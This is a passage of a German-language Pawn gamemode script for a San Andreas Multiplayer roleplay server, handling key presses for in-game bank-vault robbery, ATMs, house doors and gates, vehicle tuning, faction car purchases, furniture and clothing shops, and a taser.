	                        /*Moneybag[playerid] = CreateObject(1550, 0.0, 0.0, 0.0, 0.0, 0, 0.0);
							AttachObjectToPlayer(Moneybag[playerid], playerid, 0,-0.237999,-0.093999, 0.200000,0,166.100006);*/
							SetPlayerAttachedObject(playerid, 3, 1550, 1, 0.070999,-0.285000,0.016999,3.200000,84.000015,0.699999,0.913000,0.907999,0.778000);
							Moneytimer[playerid] = SetTimerEx("Gelderhalten",1000*60*15,0,"d",playerid);
							Bankraubgeld[playerid] = 0;
						}
				        new Float:zahl = 2000+random(500),string[120];
				        //GebeGeld(playerid,zahl);
				        Bankraubgeld[playerid] += zahl;
				        format(string,sizeof string,"$ %.2f",Bankraubgeld[playerid]);
						PlayerTextDrawSetString(playerid,Bankklau[playerid][1],string);
				        Bankfach[o][1] = 3600;
				        SpielerInfo[playerid][uWantedLevel] += 3;
				   		SendClientMessage(playerid,COLOR_HQ,"Du hast wegen Knacken eines Schliesßfaches 3 Wanteds erhalten!");
			        	format(string,sizeof string,"Aktuelles Wantedlevel: %.",SpielerInfo[playerid][uWantedLevel]);
			        	SendClientMessage(playerid,COLOR_HQ,string);
			        	format(string,sizeof string,"+ %.2f$ im Rucksack.",zahl);
			        	SendClientMessage(playerid,COLOR_GREEN,string);
			        	if(Banktimer == 0 && Banktimer2 == 0)
			        	{
			        	    SendAdminMessage(COLOR_LIGHTRED,"Beide Banktüren wurden nicht gesprengt!",1);
			        	    Bankraubgeld[playerid] -= zahl;
			        	    format(string,sizeof string,"$ %.2f",Bankraubgeld[playerid]);
							PlayerTextDrawSetString(playerid,Bankklau[playerid][1],string);
						}
						format(string,sizeof(string),"%s hat ein Bankfach geleert!",PlayerName(playerid));
			        	SendAdminMessage(COLOR_LIGHTRED,string,1);
			        	printf("%s",string);
					}
					else SendClientMessage(playerid,COLOR_RED,"Nicht genügend Cops online!");
			    }
			    else SendClientMessage(playerid,COLOR_RED,"Dieses Bankfach kann zur Zeit nicht ausgeraubt werden!");
			    break;
			}
		}
		for(new i = 0; i < MAX_AUTOMATEN; i++)
		{
		    if(IsPlayerInRangeOfPoint(playerid,1.5,BankAutomaten[i][0], BankAutomaten[i][1], BankAutomaten[i][2]))
		    {
		        if(SpielerInfo[playerid][ufATM] == 0)
		        {
		        	SpielerInfo[playerid][ufATM] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Benutzung ATM {0080FF}(/missionen)");
		        	new Float:belohnung;
		        	belohnung = 80;
		        	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
			    for(new a = 0; a < sizeof(ATMmenu); a++)
				{
				    TextDrawShowForPlayer(playerid,ATMmenu[a]);
				}
				new string[25];
				PlayerTextDrawShow(playerid,ATMmenu_Stand[playerid]);
				format(string,sizeof string,"Kontostand:$ %.2f",SpielerInfo[playerid][uKonto]);
				PlayerTextDrawSetString(playerid,ATMmenu_Stand[playerid],string);
				SelectTextDraw(playerid, -8257281);
		    }
		}
		for(new h = 0; h < 11; h++)
		{
		    new Float:hhx,Float:hhy,Float:hhz;
		    GetDynamicObjectPos(HausInfo[h][hSchild],hhx,hhy,hhz);
			if(IsPlayerInRangeOfPoint(playerid,5.0,hhx,hhy,hhz))
			{
				if(HausInfo[h][hBesitzer] == -1)
				{
					new string[50];
				    format(string,sizeof string,"Preis: %.2f\nErfahrung: %d",HausInfo[h][hPreis],HausInfo[h][hErfahrung]);
				    ShowPlayerDialog(playerid,DIALOG_HAUSKAUF,DIALOG_STYLE_MSGBOX,"Hausinformationen",string,"Kaufen","Abbrechen");
				    HouseChosen[playerid] = h;
				    //goto afterhaus;
				}
			}
		}
		for(new h = 0; h < MAX_HAEUSER; h++)
		{
		    new Float:hhx,Float:hhy,Float:hhz;
			GetDynamicObjectPos(HausInfo[h][hTuer],hhx,hhy,hhz);
			if(IsPlayerInRangeOfPoint(playerid,4.0,hhx,hhy,hhz))
			{
			    TuerSelected[playerid][0] = h;
			    TuerSelected[playerid][1] = 1;
				if(HausInfo[h][hTuerOpen] == 0)
				{
				    if(HausInfo[h][hTuerLocked] == 1)
	       			{
	       			    if(SpielerInfo[playerid][uHausschluessel] == h)
				    	{
				    	    ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Aufschließen","Okay","Abbrechen");
	       				}
	       				else
	       				{
			    	    	if(IstSpielerInFrak(playerid,4) && SpielerInfo[playerid][uDienst] == 1 || IstSpielerInFrak(playerid,3) && SpielerInfo[playerid][uDienst] == 1)
				    	    {
				    	    	ShowPlayerDialog(playerid,DIALOG_TUERENAUF,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Aufbrechen","Okay","Abbrechen");
							}else{SendClientMessage(playerid,COLOR_RED,"Abgeschlossen!");}

	       				}
			        }
					else
					{
					    if(SpielerInfo[playerid][uHausschluessel] == h)
				    	{
					    	ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Öffnen\nTür Abschließen","Okay","Abbrechen");
				    	}
				    	else
				    	{
				    	    ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Öffnen","Okay","Abbrechen");
				    	}
					}
				}
				else
				{
	   				ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Schließen","Okay","Abbrechen");
				}
	  			CancelSelectTextDraw(playerid);
			    //goto afterhaus;
			}
			new Float:hhx2,Float:hhy2,Float:hhz2;
			GetDynamicObjectPos(HausInfo[h][hTuer2],hhx2,hhy2,hhz2);
			if(IsPlayerInRangeOfPoint(playerid,4.0,hhx2,hhy2,hhz2))
			{
				TuerSelected[playerid][0] = h;
			    TuerSelected[playerid][1] = 2;
				if(HausInfo[h][hTuer2Open] == 0)
				{
				    if(HausInfo[h][hTuer2Locked] == 1)
	       			{
	       			    if(SpielerInfo[playerid][uHausschluessel] == h)
				    	{
				    	    ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Aufschließen","Okay","Abbrechen");
	       				}
	       				else
	       				{
			    	    	if(IstSpielerInFrak(playerid,4) && SpielerInfo[playerid][uDienst] == 1 || IstSpielerInFrak(playerid,3) && SpielerInfo[playerid][uDienst] == 1)
				    	    {
				    	    	ShowPlayerDialog(playerid,DIALOG_TUERENAUF,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Aufbrechen","Okay","Abbrechen");
							}else{SendClientMessage(playerid,COLOR_RED,"Abgeschlossen!");}
	       				}
			        }
					else
	 				{
					    if(SpielerInfo[playerid][uHausschluessel] == h)
				    	{
					    	ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Öffnen\nTür Abschließen","Okay","Abbrechen");
				    	}
				    	else
				    	{
					    	ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Öffnen","Okay","Abbrechen");
				    	}
					}
				}
				else
				{
	   				ShowPlayerDialog(playerid,DIALOG_TUEREN,DIALOG_STYLE_LIST,"Was willst du machen?","Tür Schließen","Okay","Abbrechen");
				}
	  			CancelSelectTextDraw(playerid);
			    //goto afterhaus;
			}
			GetDynamicObjectPos(HausInfo[h][hTor],hhx,hhy,hhz);
			if(IsPlayerInRangeOfPoint(playerid,6.0,hhx,hhy,hhz))
			{
				if(SpielerInfo[playerid][uHausschluessel] == h)
		    	{
					TuerSelected[playerid][0] = h;
				    TuerSelected[playerid][1] = 3;
				    new Float:X,Float:Y,Float:Z;
				    GetDynamicObjectPos(HausInfo[h][hTor],X,Y,Z);
				    GetDynamicObjectRot(HausInfo[h][hTor],RX,RY,RZ);
					if(HausInfo[h][hTorOpen] == 0 && HausInfo[h][hTorModel] == 5043)
					{
						if(RZ == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y-1.14,Z+1.45,1,RX,RY+90,RZ);
						else if(RZ == 0)MoveDynamicObject(HausInfo[h][hTor],X+1.27,Y,Z+1.45,1,RX,RY+90,RZ);
						else if(RZ == 180)MoveDynamicObject(HausInfo[h][hTor],X-1.27,Y,Z+1.45,1,RX,RY+90,RZ);
						else if(RZ == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y+1.14,Z+1.45,1,RX,RY-90,RZ);
						HausInfo[h][hTorOpen] = 2;
						SetTimerEx("Turzuruck",3000,0,"d",h);
					}
					else if(HausInfo[h][hTorOpen] == 1 && HausInfo[h][hTorModel] == 5043)
					{
						if(RZ == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y+1.14,Z-1.45,1,RX,RY-90,RZ);
						else if(RZ == 0)MoveDynamicObject(HausInfo[h][hTor],X-1.27,Y,Z-1.45,1,RX,RY-90,RZ);
						else if(RZ == 180)MoveDynamicObject(HausInfo[h][hTor],X+1.27,Y,Z-1.45,1,RX,RY-90,RZ);
						else if(RZ == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y-1.14,Z-1.45,1,RX,RY+90,RZ);
		   				HausInfo[h][hTorOpen] = 3;
		   				SetTimerEx("Turzuruck",3000,0,"d",h);
					}
					else if(HausInfo[h][hTorOpen] == 0 && HausInfo[h][hTorModel] == 19861)
					{
						if(RX == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
						else if(RX == 0)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
						else if(RX == 180)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
						else if(RX == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
						HausInfo[h][hTorOpen] = 2;
						SetTimerEx("Turzuruck",3000,0,"d",h);
					}
					else if(HausInfo[h][hTorOpen] == 1 && HausInfo[h][hTorModel] == 19861)
					{
						if(RX == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
						else if(RX == 0)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
						else if(RX == 180)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
						else if(RX == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
						HausInfo[h][hTorOpen] = 3;
						SetTimerEx("Turzuruck",3000,0,"d",h);
					}
				}
			}
		}
	}
	else if(newkeys == KEY_CROUCH)
	{
	    if(IsPlayerInRangeOfPoint(playerid,20,1576.1208, -9452.7764, 7.1065) && IstSpielerInFrak(playerid,2) || IstSpielerInFrak(playerid,1) && IsPlayerInRangeOfPoint(playerid,20,1576.1208, -9452.7764, 7.1065))
		{
		    if(LSPDGATEOFFEN == 0)
		    {
		        LSPDGATEOFFEN = 1;
		        MoveDynamicObject(LSPDGate,1576.1208, -9452.7764, 7.1065,2.0);
		        SendClientMessage(playerid,COLOR_GREEN,"Tor geöffnet");
		        Update3DTextLabelText(LabelPD, 0xFFFFFFFF, "{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um das Tor zu schließen");
		    }
		    else
			{
		    	LSPDGATEOFFEN = 0;
		    	MoveDynamicObject(LSPDGate,1576.12085, -9462.30273, 7.10650,2.0);
		    	SendClientMessage(playerid,COLOR_GREEN,"Tor geschlossen");
		    	Update3DTextLabelText(LabelPD, 0xFFFFFFFF, "{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} um das Tor zu öffnen");
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,20,6541.88721, -7866.26270, 5.04716) && IstSpielerInFrak(playerid,2) || IstSpielerInFrak(playerid,1) && IsPlayerInRangeOfPoint(playerid,20,6541.88721, -7866.26270, 5.04716))
		{
			if(sfpdgatex == 0)
			{
			    sfpdgatex = 1;
			    MoveDynamicObject(sfpdgate,6551.2642, -7866.2627, 5.0472,2);
			    SendClientMessage(playerid,COLOR_GREEN,"Tor geöffnet");

			}
			else
			{
			    sfpdgatex = 0;
			    MoveDynamicObject(sfpdgate,6541.88721, -7866.26270, 5.04716,2);
			    SendClientMessage(playerid,COLOR_RED,"Tor geschlossen");
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1713.1389,-9318.3789,4.4370) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
		    if(!IsPlayerInAnyVehicle(playerid))return SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug");
 			ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,6428.7695,-7830.9756,4.3785) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
		    if(!IsPlayerInAnyVehicle(playerid))return SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug");
 			ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
		}
		for(new h = 0; h < MAX_HAEUSER; h++)
		{
		    new Float:hhx,Float:hhy,Float:hhz;
			GetDynamicObjectPos(HausInfo[h][hTor],hhx,hhy,hhz);
			if(IsPlayerInRangeOfPoint(playerid,6.0,hhx,hhy,hhz))
			{
				if(SpielerInfo[playerid][uHausschluessel] == h)
		    	{
					TuerSelected[playerid][0] = h;
				    TuerSelected[playerid][1] = 3;
				    new Float:X,Float:Y,Float:Z,Float:RX,Float:RY,Float:RZ;
				    GetDynamicObjectPos(HausInfo[h][hTor],X,Y,Z);
				    GetDynamicObjectRot(HausInfo[h][hTor],RX,RY,RZ);

					if(HausInfo[h][hTorOpen] == 0 && HausInfo[h][hTorModel] == 5043)
					{
						if(RZ == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y-1.14,Z+1.45,1,RX,RY+90,RZ);
						else if(RZ == 0)MoveDynamicObject(HausInfo[h][hTor],X+1.27,Y,Z+1.45,1,RX,RY+90,RZ);
						else if(RZ == 180)MoveDynamicObject(HausInfo[h][hTor],X-1.27,Y,Z+1.45,1,RX,RY+90,RZ);
						else if(RZ == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y+1.14,Z+1.45,1,RX,RY-90,RZ);
						HausInfo[h][hTorOpen] = 2;
						SetTimerEx("Turzuruck",3000,0,"d",h);
					}
					else if(HausInfo[h][hTorOpen] == 1 && HausInfo[h][hTorModel] == 5043)
					{
						if(RZ == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y+1.14,Z-1.45,1,RX,RY-90,RZ);
						else if(RZ == 0)MoveDynamicObject(HausInfo[h][hTor],X-1.27,Y,Z-1.45,1,RX,RY-90,RZ);
						else if(RZ == 180)MoveDynamicObject(HausInfo[h][hTor],X+1.27,Y,Z-1.45,1,RX,RY-90,RZ);
						else if(RZ == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y-1.14,Z-1.45,1,RX,RY+90,RZ);
		   				HausInfo[h][hTorOpen] = 3;
		   				SetTimerEx("Turzuruck",3000,0,"d",h);
					}
					else if(HausInfo[h][hTorOpen] == 0 && HausInfo[h][hTorModel] == 19861)
					{
						if(RX == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
						else if(RX == 0)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
						else if(RX == 180)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
						else if(RX == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z+0.5,1,RX+90,RY,RZ);
						HausInfo[h][hTorOpen] = 2;
						SetTimerEx("Turzuruck",3000,0,"d",h);
					}
					else if(HausInfo[h][hTorOpen] == 1 && HausInfo[h][hTorModel] == 19861)
					{
						if(RX == 90)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
						else if(RX == 0)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
						else if(RX == 180)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
						else if(RX == 270)MoveDynamicObject(HausInfo[h][hTor],X,Y,Z-0.5,1,RX-90,RY,RZ);
						HausInfo[h][hTorOpen] = 3;
						SetTimerEx("Turzuruck",3000,0,"d",h);
					}
				}
			}
		}
	}
	else if(newkeys & KEY_NO)
	{
		if(IsPlayerInAnyVehicle(playerid)) return CallLocalFunction("cmd_motor","d",playerid);
	}
	else if(newkeys & KEY_YES)
	{
		ShowPlayerDialog(playerid,DIALOG_AKTIONEN,DIALOG_STYLE_LIST,"Wähle aus:","Objekt-Zeiger\nTextdraw-Zeiger","Okay","Abbrechen");
	}
	else if(newkeys & KEY_SUBMISSION)
	{
	    if(IsPlayerInAnyVehicle(playerid)) return CallLocalFunction("cmd_licht","d",playerid);
	}
	else if(newkeys & KEY_SPRINT)
	{
	    if(SpielerInfo[playerid][uEingeloggt] == 0) return 0;
	    if(Tuning_farbe[playerid] != 0)
	    {
	        if(Tune_Farbe1[playerid] == -1)
	        {
		        Tune_Farbe1[playerid] = Tuning_farbe[playerid];
			}
			else
			{
			    PlayerPlaySound(playerid,1134,0.0,0.0,0.0);
			    ChangeVehicleColor(GetPlayerVehicleID(playerid),PayNSprayFarben[Tune_Farbe1[playerid]-1][1],PayNSprayFarben[Tuning_farbe[playerid]-1][1]);
				for(new wert = 0; wert < sizeof(Farbtabelle); wert++)
				{
					TextDrawHideForPlayer(playerid,Farbtabelle[wert]);
				}
				TextDrawHideForPlayer(playerid,Farbtabelle_hintergrund);
				PlayerTextDrawHide(playerid,Farbtabelle_rahmen[playerid]);
				PlayerTextDrawDestroy(playerid,Farbtabelle_rahmen[playerid]);
				Unfreeze(playerid);
				GebeGeld(playerid,-250);
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    for(new x = 0; x < 2; x++)
				    {
				        if(SAuto[i][x][sID] > -1 && GetPlayerVehicleID(playerid) == SAuto[i][x][sID])
				        {
				            SAuto[i][x][sFarbe1] = PayNSprayFarben[Tune_Farbe1[playerid]-1][1];
				            SAuto[i][x][sFarbe2] = PayNSprayFarben[Tuning_farbe[playerid]-1][1];
				            break;
				        }
				    }
				}
				Tune_Farbe1[playerid]  = -1;
				Tuning_farbe[playerid] = 0;
    			ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
			}
		}
		else if(FrakAutochoose[playerid] != -1)
		{
		    new rand = random(sizeof(AutohausParkplaetze)),leiter = SpielerInfo[playerid][uLeiter];
		    if(Fraktionskasse[leiter] >= AutoListePreise[leiter-1][FrakAutochoose[playerid]])
		    {
		        Fraktionskasse[leiter] -= float(AutoListePreise[leiter-1][FrakAutochoose[playerid]]);
		        Frakkassespeichern(leiter);
			   	for(new y = 0; y < 20; y++)
			    {
       				if(FrakFahrzeuge[leiter][y][FModell] < 399)
			        {
			            new string[500];
			            FrakFahrzeuge[leiter][y][FModell] = AutoListe[leiter-1][FrakAutochoose[playerid]];
         		    	FrakFahrzeuge[leiter][y][FX] = AutohausParkplaetze[rand][0];
					    FrakFahrzeuge[leiter][y][FY] = AutohausParkplaetze[rand][1];
					    FrakFahrzeuge[leiter][y][FZ] = AutohausParkplaetze[rand][2];
					    FrakFahrzeuge[leiter][y][FRZ] = AutohausParkplaetze[rand][3];
					    if(IstModellHeli(AutoListe[leiter-1][FrakAutochoose[playerid]]))
					    {
					    	FrakFahrzeuge[leiter][y][FX] = 6526.3970;
					    	FrakFahrzeuge[leiter][y][FY] = -7839.1460;
					    	FrakFahrzeuge[leiter][y][FZ] = 273.9448;
					    	FrakFahrzeuge[leiter][y][FRZ] = 180.6575;
					    }
					    FrakFahrzeuge[leiter][y][FKilometer] = 0; FrakFahrzeuge[leiter][y][FZustand] = 100.0; FrakFahrzeuge[leiter][y][FAbgeschleppt] = 0;
                        if(FrakFahrzeuge[leiter][y][FModell] == 407 || FrakFahrzeuge[leiter][y][FModell] == 544)
                        {
   							FrakFahrzeuge[leiter][y][FID] = CreateVehicle(AutoListe[leiter-1][FrakAutochoose[playerid]],FrakFahrzeuge[leiter][y][FX],FrakFahrzeuge[leiter][y][FY],FrakFahrzeuge[leiter][y][FZ],FrakFahrzeuge[leiter][y][FRZ],FrakFahrzeugeFarben[leiter][1],FrakFahrzeugeFarben[leiter][0],-1);
                        }
                        else if(FrakFahrzeuge[leiter][y][FModell] == 573 || FrakFahrzeuge[leiter][y][FModell] == 525)
                        {
                            FrakFahrzeuge[leiter][y][FID] = CreateVehicle(AutoListe[leiter-1][FrakAutochoose[playerid]],FrakFahrzeuge[leiter][y][FX],FrakFahrzeuge[leiter][y][FY],FrakFahrzeuge[leiter][y][FZ],FrakFahrzeuge[leiter][y][FRZ],FrakFahrzeugeFarben[leiter][0],FrakFahrzeugeFarben[leiter][1],1);
                        }
                        else
                        {
							FrakFahrzeuge[leiter][y][FID] = CreateVehicle(AutoListe[leiter-1][FrakAutochoose[playerid]],FrakFahrzeuge[leiter][y][FX],FrakFahrzeuge[leiter][y][FY],FrakFahrzeuge[leiter][y][FZ],FrakFahrzeuge[leiter][y][FRZ],FrakFahrzeugeFarben[leiter][0],FrakFahrzeugeFarben[leiter][1],-1 );
						}
						FrakFahrzeuge[leiter][y][FModell] = AutoListe[leiter-1][FrakAutochoose[playerid]];
						FrakFahrzeuge[leiter][y][FPreis] = AutoListePreise[leiter-1][FrakAutochoose[playerid]];
	 					format(string,sizeof string,"INSERT INTO frakautos (`Fraktion`, `ID`, `Modell`, `Rang`, `X`, `Y`, `Z`, `RZ`, `Kilometer`,`Preis`,`Zustand`,`Abgeschleppt`) VALUES ('%d', '%d', '%d', '%d', '%.1f', '%.1f', '%.1f', '%.1f', '%d', '%.2f', '%.2f','%d');",leiter,y,FrakFahrzeuge[leiter][y][FModell],FrakFahrzeuge[leiter][y][FRang],FrakFahrzeuge[leiter][y][FX],FrakFahrzeuge[leiter][y][FY],FrakFahrzeuge[leiter][y][FZ],
			 			FrakFahrzeuge[leiter][y][FRZ],FrakFahrzeuge[leiter][y][FKilometer],FrakFahrzeuge[leiter][y][FPreis],FrakFahrzeuge[leiter][y][FZustand],FrakFahrzeuge[leiter][y][FAbgeschleppt]);
                        mysql_query(dbhandle, string, true);
                        printf("%s",string);
                        FrakFahrzeuge[leiter][y][FSQLID] = cache_insert_id();
                        printf("Fahrzeug wird erstellt und hat die ID %d",FrakFahrzeuge[leiter][y][FSQLID]);
						FrakAutosSpeichern(leiter);
					 	format(string,sizeof string,"CI-%s-%d",KFZAbk[leiter-1],y);
						SetVehicleNumberPlate(FrakFahrzeuge[leiter][y][FID],string);
						SetVehicleToRespawn(FrakFahrzeuge[leiter][y][FID]);
      					Benzin[FrakFahrzeuge[leiter][y][FID]] = AutoDaten[FrakFahrzeuge[leiter][y][FModell]-399][MaxBenzin];
				 		FalscherKraftstoff[FrakFahrzeuge[leiter][y][FID]] = 0;
						Motorschaden[FrakFahrzeuge[leiter][y][FID]] = 0;
						BenzinVerbrauch[FrakFahrzeuge[leiter][y][FID]] = 0;
					 	Meter[FrakFahrzeuge[leiter][y][FID]] = 0;
					 	Meter2[FrakFahrzeuge[leiter][y][FID]] = 0;
					 	SaveCoords(FrakFahrzeuge[leiter][y][FID]);
					 	Blaulicht[FrakFahrzeuge[leiter][y][FID]] = -1;
					 	FrakFahrzeuge[leiter][y][FRang] = 1;
					 	Motorschaden2[FrakFahrzeuge[leiter][y][FID]] = 0;
						break;
					}
				}
	            Unfreeze(playerid);
	            SetCameraBehindPlayer(playerid);
             	FrakAutochoose[playerid] = -1;
        		for(new x = 0; x < 5; x++) PlayerTextDrawHide(playerid, Autohaus[playerid][x]);
        		PlayerTextDrawHide(playerid, Autohaus[playerid][7]);
        		SendClientMessage(playerid,COLOR_GREEN,"Fraktionsauto gekauft!");
		    }
		    else SendClientMessage(playerid,COLOR_RED,"In der Fraktionskasse ist nicht genug Geld!");
		}
		else if(MoebelKategorie[playerid] != -1)
		{
		    new id = 0;
		    if(SpielerInfo[playerid][uGeld] < MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][1]) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
		    for(new x = 0; x < MAX_INVENTAR; x++)
	        {
	            if(Inventar[playerid][x] < 100)
	            {
		        	Inventar[playerid][x] = MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][0];
		        	GebeGeld(playerid,-MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][1]);
		        	id = 1;
		        	break;
	        	}
	        }
	        if(id == 0) SendClientMessage(playerid,COLOR_RED,"Du besitzt schon die maximale Anzahl an Möbeln!");
		}
		else if(KleidungChoose[playerid] != 0)
		{
            KleidungChoose[playerid] = 0;
            Unfreeze(playerid);
            SetCameraBehindPlayer(playerid);
            GebeGeld(playerid,-40);
            SpielerInfo[playerid][uZiviSkin] = GetPlayerSkin(playerid);
			SpielerInfo[playerid][uZiviFrak] = 0;
            SendClientMessage(playerid,COLOR_GREEN,"Danke für deinen Einkauf! Der Skin kostet dich 40$");
            BizInfo[0][bkasse] += 40.0;Geschaftspeichern(0);

		}
	}
	if(newkeys == KEY_ACTION && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
  	{
  	    new vid = GetClosestVehicleWithout(playerid,GetPlayerVehicleID(playerid));
  	    if(IstSpielerInFrak(playerid,3) || IstSpielerInFrak(playerid,4))
  	    {
      		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 525 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 443)
        	{
           		new Float:X,Float:Y,Float:Z/*,string[50]*/;
  	    		GetVehiclePos(vid,X,Y,Z);
  	    		if(IsPlayerInRangeOfPoint(playerid,8.0,X,Y,Z))
  	    		{
             		AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
       			}
        	}
  	    }
  	    new Float:X,Float:Y,Float:Z;
  	    GetVehiclePos(vid,X,Y,Z);
  	    if(IsPlayerInRangeOfPoint(playerid,5.0,X,Y,Z))
  	    {
    		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 531)
     		{
			    if(GetVehicleModel(vid) == 610)
			    {
	   				if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
      				{
	        			DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
		        	}
				    AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
		  		}
	 		}
 		}
  	    GetVehiclePos(vid,X,Y,Z);
  	    if(IsPlayerInRangeOfPoint(playerid,5.0,X,Y,Z))
  	    {
    		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 403)
     		{
			    if(GetVehicleModel(vid) == 591)
			    {
	   				if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
      				{
	        			DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
		        	}
				    AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
		  		}
	 		}
 		}
	}
	if ((newkeys & KEY_JUMP) && !(oldkeys & KEY_JUMP))
	{
	    if(GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_USEJETPACK)
	    {
		    AntiCheat[playerid][cSprung]+=2;
		    if(AntiCheat[playerid][cSprung] > 6)
		    {
				Freeze(playerid); SetTimerEx("Unfreeze",100,0,"d",playerid);
				AntiCheat[playerid][cSprung] = 0;
		    }
	    }
	}
	else if((newkeys & KEY_FIRE) && !(oldkeys & KEY_FIRE))
	{
	    if(!IsPlayerInAnyVehicle(playerid) && GetPlayerWeapon(playerid) == 0)
	    if(HatTaser[playerid] == 1)
	    {
			for(new suspect = 0; suspect < MAX_PLAYERS; suspect++)
			{
   				if(IsPlayerConnected(suspect) && EntfernungZwischenSpielern(playerid,suspect) < 2)
				{
				    if(playerid == suspect) continue;
				    if(GetPlayerTargetPlayer(playerid) == suspect)
				    {
	   					if(IstSpielerInFrak(suspect,1) || IstSpielerInFrak(suspect,2)) return SendClientMessage(playerid, COLOR_GREY, "Du kannst keinen Beamten Tazern!");
	   					if(TazerBereit[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "Dein Tazer ist noch nicht aufgeladen! (5 Sekunden)");
						if(IsPlayerInAnyVehicle(suspect)) return SendClientMessage(playerid, COLOR_GREY, "Der Betroffene ist in einem Fahrzeug!");
		    			new string[100];
						format(string, sizeof(string), "%s hat dich mit dem Tazer niedergestreckt.",PlayerName(playerid));
						SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "Du hast %s mit dem Tazer niedergestreckt.",PlayerName(suspect));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/tazer.mp3");
						PlayAudioStreamForPlayer(suspect, "https://county-islands.com/sounds/tazer.mp3");
						ApplyAnimation(suspect, "CRACK", "crckdeth2", 4.2, 1, 0, 0, 1, 15000, 1);
